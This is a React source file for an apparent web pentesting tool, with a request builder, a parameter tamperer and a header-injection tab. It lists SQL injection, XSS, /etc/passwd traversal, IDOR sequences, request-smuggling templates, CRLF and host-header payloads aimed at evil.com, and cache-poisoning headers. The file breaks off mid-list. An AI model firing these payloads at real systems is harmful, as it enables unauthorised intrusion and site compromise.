import { useState, useMemo, useCallback } from "react";
import { Card } from "../components/ui/Card.jsx";
import { Input } from "../components/ui/Input.jsx";
import { CopyButton } from "../components/ui/CopyButton.jsx";
import { ToolHelp } from '../components/ui/ToolHelp.jsx';
import {
  Pencil,
  Send,
  Plus,
  Trash2,
  Play,
  AlertTriangle,
  Check,
  X,
  Loader,
} from "lucide-react";

const mono = "JetBrains Mono, monospace";
const heading = "Space Grotesk, sans-serif";

const ACCENT = "#FBBF24";
const BG_INPUT = "#0B0F18";

const TABS = [
  { value: "builder", label: "Request Builder" },
  { value: "tamper", label: "Parameter Tamper" },
  { value: "injection", label: "Header Injection" },
  { value: "response", label: "Response Analyzer" },
];

// ─────────────────────────────────────────────
// Shared UI
// ─────────────────────────────────────────────

function SectionTitle({ children }) {
  return (
    <h3 style={{ fontFamily: heading, fontSize: 14, fontWeight: 600, color: "#E5E7EB", margin: "0 0 10px 0" }}>
      {children}
    </h3>
  );
}

function CodeBlock({ code, label }) {
  return (
    <div style={{ marginBottom: 10 }}>
      {label && (
        <div style={{ fontFamily: mono, fontSize: 9, color: "#6B7280", textTransform: "uppercase", letterSpacing: "0.06em", marginBottom: 4 }}>
          {label}
        </div>
      )}
      <div style={{ display: "flex", alignItems: "flex-start", gap: 6, background: BG_INPUT, borderRadius: 8, padding: "10px 12px", border: "1px solid rgba(255,255,255,0.04)" }}>
        <code style={{ fontFamily: mono, fontSize: 11, color: "#E2E8F0", lineHeight: 1.6, whiteSpace: "pre-wrap", wordBreak: "break-all", flex: 1 }}>
          {code}
        </code>
        <CopyButton text={code} />
      </div>
    </div>
  );
}

function PayloadRow({ text, desc, accent = ACCENT }) {
  return (
    <div style={{ display: "flex", alignItems: "center", gap: 8, padding: "8px 12px", borderBottom: "1px solid rgba(255,255,255,0.04)" }}>
      <code style={{ fontFamily: mono, fontSize: 11, color: "#E2E8F0", flex: 1, wordBreak: "break-all" }}>{text}</code>
      {desc && <span style={{ fontFamily: mono, fontSize: 9, color: "#6B7280", flexShrink: 0, maxWidth: 200, textAlign: "right" }}>{desc}</span>}
      <CopyButton text={text} />
    </div>
  );
}

function PillButton({ active, onClick, children }) {
  return (
    <button
      onClick={onClick}
      style={{
        padding: "5px 12px", borderRadius: 6, border: "none", cursor: "pointer",
        fontFamily: mono, fontSize: 10, fontWeight: 600,
        background: active ? `${ACCENT}18` : "rgba(255,255,255,0.03)",
        color: active ? ACCENT : "#6B7280", transition: "all 100ms",
      }}
    >
      {children}
    </button>
  );
}

function StatusDot({ color }) {
  return <span style={{ display: "inline-block", width: 8, height: 8, borderRadius: "50%", background: color, flexShrink: 0 }} />;
}

// ─────────────────────────────────────────────
// Tab 1: Request Builder
// ─────────────────────────────────────────────

const HTTP_METHODS = ["GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS"];
const CONTENT_TYPES = [
  "application/json",
  "application/x-www-form-urlencoded",
  "multipart/form-data",
  "text/plain",
  "text/xml",
  "application/xml",
  "text/html",
];
const HEADER_PRESETS = [
  { key: "Authorization", value: "Bearer <token>" },
  { key: "Content-Type", value: "application/json" },
  { key: "Accept", value: "application/json" },
  { key: "Cache-Control", value: "no-cache" },
  { key: "X-Requested-With", value: "XMLHttpRequest" },
  { key: "Origin", value: "https://target.com" },
  { key: "Referer", value: "https://target.com/" },
  { key: "Cookie", value: "session=abc123" },
  { key: "X-CSRF-Token", value: "<token>" },
  { key: "Accept-Language", value: "en-US,en;q=0.9" },
  { key: "Accept-Encoding", value: "gzip, deflate, br" },
  { key: "If-None-Match", value: '"etag-value"' },
  { key: "If-Modified-Since", value: "Wed, 25 Mar 2026 00:00:00 GMT" },
  { key: "X-Forwarded-For", value: "127.0.0.1" },
];

function BuilderTab() {
  const [method, setMethod] = useState("GET");
  const [url, setUrl] = useState("https://target.com/api/v1/users");
  const [httpVersion, setHttpVersion] = useState("HTTP/1.1");
  const [headers, setHeaders] = useState([
    { key: "Content-Type", value: "application/json" },
    { key: "Accept", value: "application/json" },
  ]);
  const [bodyFormat, setBodyFormat] = useState("json");
  const [rawBody, setRawBody] = useState('{\n  "username": "admin",\n  "password": "password123"\n}');
  const [formFields, setFormFields] = useState([
    { key: "username", value: "admin" },
    { key: "password", value: "password123" },
  ]);
  const [response, setResponse] = useState(null);
  const [loading, setLoading] = useState(false);

  const addHeader = useCallback((preset) => {
    setHeaders((h) => [...h, preset ? { ...preset } : { key: "", value: "" }]);
  }, []);

  const removeHeader = useCallback((idx) => {
    setHeaders((h) => h.filter((_, i) => i !== idx));
  }, []);

  const updateHeader = useCallback((idx, field, val) => {
    setHeaders((h) => h.map((hdr, i) => (i === idx ? { ...hdr, [field]: val } : hdr)));
  }, []);

  const addFormField = useCallback(() => {
    setFormFields((f) => [...f, { key: "", value: "" }]);
  }, []);

  const removeFormField = useCallback((idx) => {
    setFormFields((f) => f.filter((_, i) => i !== idx));
  }, []);

  const updateFormField = useCallback((idx, field, val) => {
    setFormFields((f) => f.map((ff, i) => (i === idx ? { ...ff, [field]: val } : ff)));
  }, []);

  const getBody = useCallback(() => {
    if (method === "GET" || method === "HEAD") return null;
    if (bodyFormat === "json" || bodyFormat === "raw" || bodyFormat === "xml") return rawBody;
    if (bodyFormat === "form") {
      return formFields.map((f) => `${encodeURIComponent(f.key)}=${encodeURIComponent(f.value)}`).join("&");
    }
    return rawBody;
  }, [method, bodyFormat, rawBody, formFields]);

  const toCurl = useCallback(() => {
    const parts = [`curl -X ${method}`];
    headers.forEach((h) => {
      if (h.key) parts.push(`  -H "${h.key}: ${h.value}"`);
    });
    const body = getBody();
    if (body) parts.push(`  -d '${body.replace(/'/g, "\\'")}'`);
    parts.push(`  "${url}"`);
    return parts.join(" \\\n");
  }, [method, url, headers, getBody]);

  const toPython = useCallback(() => {
    const hdrs = {};
    headers.forEach((h) => { if (h.key) hdrs[h.key] = h.value; });
    const body = getBody();
    let code = `import requests\n\nresponse = requests.${method.toLowerCase()}(\n    "${url}",\n    headers=${JSON.stringify(hdrs, null, 4)}`;
    if (body) {
      if (bodyFormat === "json") code += `,\n    json=${body}`;
      else code += `,\n    data="${body.replace(/"/g, '\\"')}"`;
    }
    code += `\n)\n\nprint(response.status_code)\nprint(response.text)`;
    return code;
  }, [method, url, headers, getBody, bodyFormat]);

  const toFetch = useCallback(() => {
    const hdrs = {};
    headers.forEach((h) => { if (h.key) hdrs[h.key] = h.value; });
    const body = getBody();
    let code = `const response = await fetch("${url}", {\n  method: "${method}",\n  headers: ${JSON.stringify(hdrs, null, 2)}`;
    if (body) {
      if (bodyFormat === "json") code += `,\n  body: JSON.stringify(${body})`;
      else code += `,\n  body: ${JSON.stringify(body)}`;
    }
    code += `\n});\n\nconst data = await response.json();\nconsole.log(response.status, data);`;
    return code;
  }, [method, url, headers, getBody, bodyFormat]);

  const toHar = useCallback(() => {
    const hdrs = headers.filter((h) => h.key).map((h) => ({ name: h.key, value: h.value }));
    const entry = {
      log: {
        version: "1.2",
        entries: [{
          request: {
            method,
            url,
            httpVersion,
            headers: hdrs,
            queryString: [],
            postData: getBody() ? { mimeType: headers.find((h) => h.key === "Content-Type")?.value || "text/plain", text: getBody() } : undefined,
          },
        }],
      },
    };
    return JSON.stringify(entry, null, 2);
  }, [method, url, httpVersion, headers, getBody]);

  const sendRequest = useCallback(async () => {
    setLoading(true);
    setResponse(null);
    try {
      const opts = { method, headers: {} };
      headers.forEach((h) => { if (h.key) opts.headers[h.key] = h.value; });
      const body = getBody();
      if (body) opts.body = body;
      const start = performance.now();
      const res = await fetch(url, opts);
      const elapsed = Math.round(performance.now() - start);
      const text = await res.text();
      const resHeaders = {};
      res.headers.forEach((v, k) => { resHeaders[k] = v; });
      setResponse({ status: res.status, statusText: res.statusText, headers: resHeaders, body: text, time: elapsed });
    } catch (err) {
      setResponse({ error: err.message });
    }
    setLoading(false);
  }, [method, url, headers, getBody]);

  return (
    <div style={{ display: "flex", flexDirection: "column", gap: 16 }}>
      <Card style={{ padding: 20 }}>
        <div style={{ display: "flex", gap: 10, marginBottom: 16, alignItems: "flex-end" }}>
          <div>
            <div style={{ fontFamily: mono, fontSize: 9, color: "#6B7280", textTransform: "uppercase", letterSpacing: "0.06em", marginBottom: 4 }}>Method</div>
            <select
              value={method} onChange={(e) => setMethod(e.target.value)}
              style={{
                background: BG_INPUT, border: "1px solid rgba(255,255,255,0.06)", borderRadius: 8,
                padding: "8px 12px", fontFamily: mono, fontSize: 12, color: ACCENT, fontWeight: 700, cursor: "pointer", outline: "none",
              }}
            >
              {HTTP_METHODS.map((m) => <option key={m} value={m}>{m}</option>)}
            </select>
          </div>
          <div style={{ flex: 1 }}>
            <Input label="URL" value={url} onChange={(e) => setUrl(e.target.value)} placeholder="https://target.com/api/v1/users" />
          </div>
          <div>
            <div style={{ fontFamily: mono, fontSize: 9, color: "#6B7280", textTransform: "uppercase", letterSpacing: "0.06em", marginBottom: 4 }}>Version</div>
            <select
              value={httpVersion} onChange={(e) => setHttpVersion(e.target.value)}
              style={{
                background: BG_INPUT, border: "1px solid rgba(255,255,255,0.06)", borderRadius: 8,
                padding: "8px 12px", fontFamily: mono, fontSize: 12, color: "#9CA3AF", cursor: "pointer", outline: "none",
              }}
            >
              <option value="HTTP/1.0">HTTP/1.0</option>
              <option value="HTTP/1.1">HTTP/1.1</option>
              <option value="HTTP/2">HTTP/2</option>
            </select>
          </div>
        </div>

        <div style={{ display: "flex", alignItems: "center", gap: 10, marginBottom: 10 }}>
          <button
            onClick={sendRequest}
            disabled={loading}
            style={{
              display: "flex", alignItems: "center", gap: 6, padding: "10px 22px", borderRadius: 8,
              border: "none", cursor: loading ? "wait" : "pointer", fontFamily: heading, fontSize: 13, fontWeight: 700,
              color: "#0B0F18", background: `linear-gradient(135deg, ${ACCENT} 0%, #D97706 100%)`,
              boxShadow: `0 4px 14px ${ACCENT}40`, opacity: loading ? 0.7 : 1,
            }}
          >
            {loading ? <Loader size={14} style={{ animation: "spin 1s linear infinite" }} /> : <Send size={14} />}
            {loading ? "Sending..." : "Send"}
          </button>
          <CopyButton text={toCurl()} />
          <span style={{ fontFamily: mono, fontSize: 9, color: "#4B5563" }}>cURL</span>
          <CopyButton text={toPython()} />
          <span style={{ fontFamily: mono, fontSize: 9, color: "#4B5563" }}>Python</span>
          <CopyButton text={toFetch()} />
          <span style={{ fontFamily: mono, fontSize: 9, color: "#4B5563" }}>JS</span>
          <CopyButton text={toHar()} />
          <span style={{ fontFamily: mono, fontSize: 9, color: "#4B5563" }}>HAR</span>
        </div>
      </Card>

      <Card style={{ padding: 20 }}>
        <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 12 }}>
          <SectionTitle>Headers</SectionTitle>
          <div style={{ display: "flex", gap: 6 }}>
            <button
              onClick={() => addHeader()}
              style={{
                display: "flex", alignItems: "center", gap: 4, padding: "5px 10px", borderRadius: 6,
                border: "none", cursor: "pointer", fontFamily: mono, fontSize: 10, fontWeight: 600,
                background: `${ACCENT}15`, color: ACCENT,
              }}
            >
              <Plus size={10} /> Custom
            </button>
          </div>
        </div>

        <div style={{ display: "flex", flexWrap: "wrap", gap: 4, marginBottom: 12 }}>
          {HEADER_PRESETS.map((p) => (
            <button
              key={p.key}
              onClick={() => addHeader(p)}
              style={{
                padding: "3px 8px", borderRadius: 4, border: "none", cursor: "pointer",
                fontFamily: mono, fontSize: 9, background: "rgba(255,255,255,0.03)", color: "#6B7280",
              }}
            >
              + {p.key}
            </button>
          ))}
        </div>

        <div style={{ display: "flex", flexDirection: "column", gap: 6 }}>
          {headers.map((h, i) => (
            <div key={i} style={{ display: "flex", gap: 6, alignItems: "center" }}>
              <input
                value={h.key} onChange={(e) => updateHeader(i, "key", e.target.value)} placeholder="Header-Name"
                style={{
                  flex: 1, background: BG_INPUT, border: "1px solid rgba(255,255,255,0.06)", borderRadius: 6,
                  padding: "6px 10px", fontFamily: mono, fontSize: 11, color: ACCENT, fontWeight: 600, outline: "none",
                }}
              />
              <input
                value={h.value} onChange={(e) => updateHeader(i, "value", e.target.value)} placeholder="value"
                style={{
                  flex: 2, background: BG_INPUT, border: "1px solid rgba(255,255,255,0.06)", borderRadius: 6,
                  padding: "6px 10px", fontFamily: mono, fontSize: 11, color: "#D1D5DB", outline: "none",
                }}
              />
              <button onClick={() => removeHeader(i)} style={{ background: "none", border: "none", cursor: "pointer", padding: 4 }}>
                <Trash2 size={12} style={{ color: "#4B5563" }} />
              </button>
            </div>
          ))}
        </div>
      </Card>

      {method !== "GET" && method !== "HEAD" && (
        <Card style={{ padding: 20 }}>
          <div style={{ display: "flex", alignItems: "center", gap: 10, marginBottom: 12 }}>
            <SectionTitle>Body</SectionTitle>
            <div style={{ display: "flex", gap: 4 }}>
              {["json", "form", "raw", "xml"].map((fmt) => (
                <PillButton key={fmt} active={bodyFormat === fmt} onClick={() => setBodyFormat(fmt)}>
                  {fmt.toUpperCase()}
                </PillButton>
              ))}
            </div>
          </div>

          {bodyFormat === "form" ? (
            <div style={{ display: "flex", flexDirection: "column", gap: 6 }}>
              {formFields.map((f, i) => (
                <div key={i} style={{ display: "flex", gap: 6, alignItems: "center" }}>
                  <input
                    value={f.key} onChange={(e) => updateFormField(i, "key", e.target.value)} placeholder="key"
                    style={{
                      flex: 1, background: BG_INPUT, border: "1px solid rgba(255,255,255,0.06)", borderRadius: 6,
                      padding: "6px 10px", fontFamily: mono, fontSize: 11, color: ACCENT, fontWeight: 600, outline: "none",
                    }}
                  />
                  <input
                    value={f.value} onChange={(e) => updateFormField(i, "value", e.target.value)} placeholder="value"
                    style={{
                      flex: 2, background: BG_INPUT, border: "1px solid rgba(255,255,255,0.06)", borderRadius: 6,
                      padding: "6px 10px", fontFamily: mono, fontSize: 11, color: "#D1D5DB", outline: "none",
                    }}
                  />
                  <button onClick={() => removeFormField(i)} style={{ background: "none", border: "none", cursor: "pointer", padding: 4 }}>
                    <Trash2 size={12} style={{ color: "#4B5563" }} />
                  </button>
                </div>
              ))}
              <button onClick={addFormField} style={{
                display: "flex", alignItems: "center", gap: 4, padding: "5px 10px", borderRadius: 6,
                border: "1px dashed rgba(255,255,255,0.08)", cursor: "pointer", fontFamily: mono, fontSize: 10, color: "#6B7280", background: "transparent", alignSelf: "flex-start",
              }}>
                <Plus size={10} /> Add Field
              </button>
            </div>
          ) : (
            <textarea
              value={rawBody} onChange={(e) => setRawBody(e.target.value)} spellCheck={false}
              style={{
                width: "100%", minHeight: 140, boxSizing: "border-box", fontFamily: mono, fontSize: 12,
                lineHeight: 1.5, color: "#E5E7EB", background: BG_INPUT, border: "1px solid rgba(255,255,255,0.06)",
                borderRadius: 8, padding: "12px 14px", resize: "vertical", outline: "none",
              }}
            />
          )}
        </Card>
      )}

      {response && (
        <Card style={{ padding: 20 }}>
          <SectionTitle>Response</SectionTitle>
          {response.error ? (
            <div style={{ fontFamily: mono, fontSize: 12, color: "#F87171", padding: "12px 0" }}>
              <AlertTriangle size={14} style={{ verticalAlign: "-2px", marginRight: 6 }} />
              {response.error}
            </div>
          ) : (
            <>
              <div style={{ display: "flex", alignItems: "center", gap: 12, marginBottom: 14 }}>
                <span style={{
                  fontFamily: mono, fontSize: 18, fontWeight: 700,
                  color: response.status < 300 ? "#34D399" : response.status < 400 ? ACCENT : "#F87171",
                }}>
                  {response.status}
                </span>
                <span style={{ fontFamily: mono, fontSize: 12, color: "#9CA3AF" }}>{response.statusText}</span>
                <span style={{ fontFamily: mono, fontSize: 10, color: "#4B5563" }}>{response.time}ms</span>
              </div>
              <div style={{ marginBottom: 12 }}>
                <div style={{ fontFamily: mono, fontSize: 9, color: "#6B7280", textTransform: "uppercase", letterSpacing: "0.06em", marginBottom: 6 }}>Response Headers</div>
                <div style={{ background: BG_INPUT, borderRadius: 8, padding: "8px 12px", border: "1px solid rgba(255,255,255,0.04)", maxHeight: 150, overflow: "auto" }}>
                  {Object.entries(response.headers).map(([k, v]) => (
                    <div key={k} style={{ fontFamily: mono, fontSize: 11, lineHeight: 1.6 }}>
                      <span style={{ color: ACCENT }}>{k}</span><span style={{ color: "#4B5563" }}>: </span><span style={{ color: "#D1D5DB" }}>{v}</span>
                    </div>
                  ))}
                </div>
              </div>
              <div>
                <div style={{ fontFamily: mono, fontSize: 9, color: "#6B7280", textTransform: "uppercase", letterSpacing: "0.06em", marginBottom: 6 }}>Response Body</div>
                <div style={{ background: BG_INPUT, borderRadius: 8, padding: "10px 12px", border: "1px solid rgba(255,255,255,0.04)", maxHeight: 300, overflow: "auto" }}>
                  <pre style={{ fontFamily: mono, fontSize: 11, color: "#E2E8F0", margin: 0, whiteSpace: "pre-wrap", wordBreak: "break-all" }}>
                    {response.body.substring(0, 10000)}
                  </pre>
                </div>
              </div>
            </>
          )}
        </Card>
      )}

      <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
    </div>
  );
}

// ─────────────────────────────────────────────
// Tab 2: Parameter Tamper
// ─────────────────────────────────────────────

function suggestTamperValues(key, val) {
  const suggestions = [];
  const lk = key.toLowerCase();
  const isNumeric = /^\d+$/.test(val);
  const isBool = /^(true|false|1|0|yes|no)$/i.test(val);
  const isId = /id$/i.test(lk) || lk === "uid" || lk === "pid";

  if (isNumeric) {
    const n = parseInt(val, 10);
    suggestions.push(
      { label: "Original", value: val },
      { label: "Zero", value: "0" },
      { label: "Negative", value: "-1" },
      { label: "Large", value: "99999" },
      { label: "MAX_INT", value: "2147483647" },
      { label: "Null string", value: "null" },
      { label: "NaN", value: "NaN" },
      { label: "Float", value: `${n}.5` },
      { label: "Negative large", value: "-99999" },
    );
    if (isId) {
      suggestions.push(
        { label: "IDOR +1", value: String(n + 1) },
        { label: "IDOR -1", value: String(n - 1) },
        { label: "IDOR 0", value: "0" },
      );
    }
  } else if (isBool) {
    suggestions.push(
      { label: "true", value: "true" },
      { label: "false", value: "false" },
      { label: "1", value: "1" },
      { label: "0", value: "0" },
      { label: "yes", value: "yes" },
      { label: "no", value: "no" },
      { label: "null", value: "null" },
      { label: "undefined", value: "undefined" },
    );
  } else {
    suggestions.push(
      { label: "Original", value: val },
      { label: "Empty", value: "" },
      { label: "Long string", value: "A".repeat(1000) },
      { label: "Special chars", value: "!@#$%^&*(){}|:<>?" },
      { label: "SQLi", value: "' OR 1=1--" },
      { label: "XSS", value: "<script>alert(1)</script>" },
      { label: "Null byte", value: `${val}%00` },
      { label: "CRLF", value: `${val}%0d%0a` },
      { label: "Path traversal", value: "../../../../etc/passwd" },
      { label: "null", value: "null" },
      { label: "undefined", value: "undefined" },
    );
  }

  if (lk === "role" || lk === "admin" || lk === "is_admin" || lk === "isadmin" || lk === "privilege") {
    suggestions.push(
      { label: "admin", value: "admin" },
      { label: "administrator", value: "administrator" },
      { label: "root", value: "root" },
      { label: "superuser", value: "superuser" },
    );
  }

  return suggestions;
}

function parseUrlParams(urlStr) {
  try {
    const u = new URL(urlStr);
    const params = [];
    u.searchParams.forEach((v, k) => params.push({ key: k, value: v }));
    return { base: `${u.origin}${u.pathname}`, params };
  } catch {
    const qi = urlStr.indexOf("?");
    if (qi === -1) return { base: urlStr, params: [] };
    const base = urlStr.slice(0, qi);
    const qs = urlStr.slice(qi + 1);
    const params = qs.split("&").map((p) => {
      const [k, ...rest] = p.split("=");
      return { key: decodeURIComponent(k), value: decodeURIComponent(rest.join("=")) };
    });
    return { base, params };
  }
}

function TamperTab() {
  const [inputUrl, setInputUrl] = useState("https://example.com/api?id=1&role=user&admin=false&page=2");
  const [idorStart, setIdorStart] = useState("1");
  const [idorEnd, setIdorEnd] = useState("20");
  const [idorParam, setIdorParam] = useState("id");
  const [testResults, setTestResults] = useState({});
  const [testingAll, setTestingAll] = useState(false);

  const { base, params } = useMemo(() => parseUrlParams(inputUrl), [inputUrl]);

  const buildUrl = useCallback((overrides) => {
    const ps = params.map((p) => {
      const ov = overrides[p.key];
      return `${encodeURIComponent(p.key)}=${encodeURIComponent(ov !== undefined ? ov : p.value)}`;
    });
    return `${base}?${ps.join("&")}`;
  }, [base, params]);

  const idorUrls = useMemo(() => {
    const start = parseInt(idorStart, 10) || 1;
    const end = Math.min(parseInt(idorEnd, 10) || 20, start + 99);
    const urls = [];
    for (let i = start; i <= end; i++) {
      urls.push(buildUrl({ [idorParam]: String(i) }));
    }
    return urls;
  }, [idorStart, idorEnd, idorParam, buildUrl]);

  const testUrl = useCallback(async (u) => {
    try {
      const res = await fetch(u, { method: "GET", mode: "no-cors" });
      setTestResults((prev) => ({ ...prev, [u]: { status: res.status, type: res.type } }));
    } catch (err) {
      setTestResults((prev) => ({ ...prev, [u]: { error: err.message } }));
    }
  }, []);

  const testAll = useCallback(async () => {
    setTestingAll(true);
    setTestResults({});
    for (const p of params) {
      const suggestions = suggestTamperValues(p.key, p.value);
      for (const s of suggestions.slice(0, 5)) {
        const u = buildUrl({ [p.key]: s.value });
        await testUrl(u);
      }
    }
    setTestingAll(false);
  }, [params, buildUrl, testUrl]);

  return (
    <div style={{ display: "flex", flexDirection: "column", gap: 16 }}>
      <Card style={{ padding: 20 }}>
        <SectionTitle>Input URL</SectionTitle>
        <Input
          label="URL with parameters"
          value={inputUrl}
          onChange={(e) => setInputUrl(e.target.value)}
          placeholder="https://example.com/api?id=1&role=user"
        />
      </Card>

      {params.length > 0 && (
        <Card style={{ padding: 0, overflow: "hidden" }}>
          <div style={{ padding: "14px 16px", borderBottom: "1px solid rgba(255,255,255,0.04)", display: "flex", justifyContent: "space-between", alignItems: "center" }}>
            <SectionTitle>Parsed Parameters</SectionTitle>
            <button
              onClick={testAll}
              disabled={testingAll}
              style={{
                display: "flex", alignItems: "center", gap: 4, padding: "6px 14px", borderRadius: 6,
                border: "none", cursor: testingAll ? "wait" : "pointer", fontFamily: mono, fontSize: 10, fontWeight: 600,
                background: `${ACCENT}18`, color: ACCENT, opacity: testingAll ? 0.6 : 1,
              }}
            >
              <Play size={10} /> Test All
            </button>
          </div>
          {params.map((p) => {
            const suggestions = suggestTamperValues(p.key, p.value);
            return (
              <div key={p.key} style={{ padding: "14px 16px", borderBottom: "1px solid rgba(255,255,255,0.04)" }}>
                <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 10 }}>
                  <span style={{ fontFamily: mono, fontSize: 12, color: ACCENT, fontWeight: 700 }}>{p.key}</span>
                  <span style={{ fontFamily: mono, fontSize: 10, color: "#4B5563" }}>=</span>
                  <span style={{ fontFamily: mono, fontSize: 12, color: "#D1D5DB" }}>{p.value}</span>
                </div>
                <div style={{ display: "flex", flexWrap: "wrap", gap: 6 }}>
                  {suggestions.map((s, i) => {
                    const tampered = buildUrl({ [p.key]: s.value });
                    const result = testResults[tampered];
                    return (
                      <div key={i} style={{
                        display: "flex", alignItems: "center", gap: 4, padding: "4px 8px", borderRadius: 6,
                        background: "rgba(255,255,255,0.03)", border: "1px solid rgba(255,255,255,0.04)",
                      }}>
                        <span style={{ fontFamily: mono, fontSize: 9, color: "#9CA3AF" }}>{s.label}:</span>
                        <code style={{ fontFamily: mono, fontSize: 10, color: "#E2E8F0", maxWidth: 120, overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>
                          {s.value || '""'}
                        </code>
                        <CopyButton text={tampered} />
                        {result && (
                          <span style={{ fontFamily: mono, fontSize: 9, color: result.error ? "#F87171" : result.status < 400 ? "#34D399" : "#F87171" }}>
                            {result.error ? "ERR" : result.status || result.type}
                          </span>
                        )}
                      </div>
                    );
                  })}
                </div>
              </div>
            );
          })}
        </Card>
      )}

      <Card style={{ padding: 20 }}>
        <SectionTitle>IDOR Sequence Generator</SectionTitle>
        <div style={{ display: "flex", gap: 10, marginBottom: 14, alignItems: "flex-end" }}>
          <div style={{ width: 120 }}>
            <Input label="Param name" value={idorParam} onChange={(e) => setIdorParam(e.target.value)} placeholder="id" />
          </div>
          <div style={{ width: 80 }}>
            <Input label="From" value={idorStart} onChange={(e) => setIdorStart(e.target.value)} placeholder="1" />
          </div>
          <div style={{ width: 80 }}>
            <Input label="To" value={idorEnd} onChange={(e) => setIdorEnd(e.target.value)} placeholder="20" />
          </div>
        </div>
        <div style={{ maxHeight: 200, overflow: "auto" }}>
          {idorUrls.map((u, i) => (
            <PayloadRow key={i} text={u} />
          ))}
        </div>
      </Card>
    </div>
  );
}

// ─────────────────────────────────────────────
// Tab 3: Header Injection
// ─────────────────────────────────────────────

const SMUGGLING_PAYLOADS = [
  {
    title: "CL.TE Request Smuggling",
    desc: "Front-end uses Content-Length, back-end uses Transfer-Encoding",
    payload: `POST / HTTP/1.1\nHost: target.com\nContent-Length: 13\nTransfer-Encoding: chunked\n\n0\n\nSMUGGLED`,
  },
  {
    title: "TE.CL Request Smuggling",
    desc: "Front-end uses Transfer-Encoding, back-end uses Content-Length",
    payload: `POST / HTTP/1.1\nHost: target.com\nContent-Length: 3\nTransfer-Encoding: chunked\n\n8\nSMUGGLED\n0\n\n`,
  },
  {
    title: "TE.TE Obfuscation",
    desc: "Both use TE but one can be confused with obfuscated header",
    payload: `POST / HTTP/1.1\nHost: target.com\nTransfer-Encoding: chunked\nTransfer-Encoding: cow\n\n0\n\nSMUGGLED`,
  },
  {
    title: "H2.CL Smuggling (HTTP/2 downgrade)",
    desc: "HTTP/2 front-end with HTTP/1.1 back-end",
    payload: `POST / HTTP/2\nHost: target.com\nContent-Length: 0\n\nGET /admin HTTP/1.1\nHost: target.com\n\n`,
  },
];

const CRLF_PAYLOADS = [
  { payload: "%0d%0aInjected-Header: value", desc: "Basic CRLF injection" },
  { payload: "%0aInjected-Header: value", desc: "LF only injection" },
  { payload: "%0d%0a%0d%0a<html>injected</html>", desc: "CRLF to HTTP response splitting" },
  { payload: "%0d%0aSet-Cookie: admin=true", desc: "Cookie injection via CRLF" },
  { payload: "%0d%0aLocation: https://evil.com", desc: "Redirect via CRLF" },
  { payload: "%0d%0aContent-Length: 0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a<html>fake</html>", desc: "Full response injection" },
  { payload: "%E5%98%8A%E5%98%8DInjected: true", desc: "UTF-8 encoded CRLF" },
  { payload: "%c0%8d%c0%8aInjected: true", desc: "Overlong UTF-8 CRLF" },
  { payload: "\\r\\nInjected: true", desc: "Escaped CRLF" },
  { payload: "%0d%0aX-Forwarded-For: 127.0.0.1", desc: "IP spoof via CRLF" },
  { payload: "%0d%0aTransfer-Encoding: chunked", desc: "Smuggling via CRLF" },
  { payload: "%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert(1)</script>", desc: "XSS via CRLF" },
  { payload: "%0d%0aAccess-Control-Allow-Origin: *", desc: "CORS bypass via CRLF" },
  { payload: "%0d%0aX-XSS-Protection: 0", desc: "Disable XSS protection via CRLF" },
  { payload: "%0d%0a%0d%0a{\"admin\":true}", desc: "JSON body injection" },
  { payload: "%00%0d%0aInjected: true", desc: "Null byte + CRLF" },
  { payload: "%0d%0aHost: evil.com", desc: "Host header override via CRLF" },
  { payload: "%0d%0aX-Forwarded-Host: evil.com", desc: "Forwarded host via CRLF" },
  { payload: "%0d %0a Injected: true", desc: "Space-padded CRLF" },
  { payload: "%%0d0a%%0d0aInjected: true", desc: "Double-encoded partial CRLF" },
  { payload: "%0d%0aLink: <https://evil.com>; rel=preload", desc: "Resource preload injection" },
  { payload: "%0d%0aRefresh: 0;url=https://evil.com", desc: "Refresh redirect via CRLF" },
  { payload: "%0d%0aX-Forwarded-Proto: https", desc: "Protocol override via CRLF" },
  { payload: "%0d%0aP3P: CP=\"ALL\"", desc: "Privacy policy override via CRLF" },
  { payload: "%0d%0aExpect: 100-continue", desc: "Expect header injection" },
  { payload: "%0d%0aUpgrade: websocket", desc: "WebSocket upgrade injection" },
  { payload: "%0d%0aConnection: keep-alive", desc: "Connection persistence" },
  { payload: "%0d%0aVia: 1.1 evil-proxy", desc: "Proxy chain injection" },
  { payload: "%0d%0aWarning: 299 evil \"message\"", desc: "Warning header injection" },
  { payload: "%0d%0aAge: 0", desc: "Cache age reset" },
];

const HOST_HEADER_ATTACKS = [
  { payload: "Host: evil.com", desc: "Basic host override" },
  { payload: "Host: target.com\nHost: evil.com", desc: "Duplicate Host header" },
  { payload: "Host: target.com\nX-Forwarded-Host: evil.com", desc: "X-Forwarded-Host override" },
  { payload: "Host: target.com\nX-Host: evil.com", desc: "X-Host override" },
  { payload: "Host: target.com\nX-Forwarded-Server: evil.com", desc: "X-Forwarded-Server" },
  { payload: "Host: target.com\nX-HTTP-Host-Override: evil.com", desc: "HTTP Host Override" },
  { payload: "Host: target.com\nForwarded: host=evil.com", desc: "RFC 7239 Forwarded header" },
  { payload: "GET https://evil.com/ HTTP/1.1\nHost: target.com", desc: "Absolute URL override" },
  { payload: "Host: target.com:@evil.com", desc: "At-sign in host" },
  { payload: "Host: target.com#@evil.com", desc: "Fragment in host" },
  { payload: "Host: evil.com%00target.com", desc: "Null byte in host" },
  { payload: "Host: evil.com%23@target.com", desc: "Encoded hash in host" },
  { payload: "Host: target.com\nX-Original-URL: /admin", desc: "URL override for path restriction bypass" },
  { payload: "Host: target.com\nX-Rewrite-URL: /admin", desc: "URL rewrite for path restriction bypass" },
  { payload: "Host: localhost", desc: "Localhost host header" },
  { payload: "Host: 127.0.0.1", desc: "Loopback IP host" },
];

const CACHE_POISON_HEADERS = [
  { payload: "X-Forwarded-Host: evil.com", desc: "Cache key manipulation via forwarded host" },
  { payload: "X-Forwarded-Scheme: nothttps", desc: "Scheme override for cache poisoning" },
  { payload: "X-Original-URL: /different-page", desc: "URL override for cache mismatch" },
  { payload: "X-Forwarded-Port: 1234", desc: "Port override for cache key" },
  { payload: "X-Forwarded-Prefix: /prefix", desc: "Path prefix manipulation" },
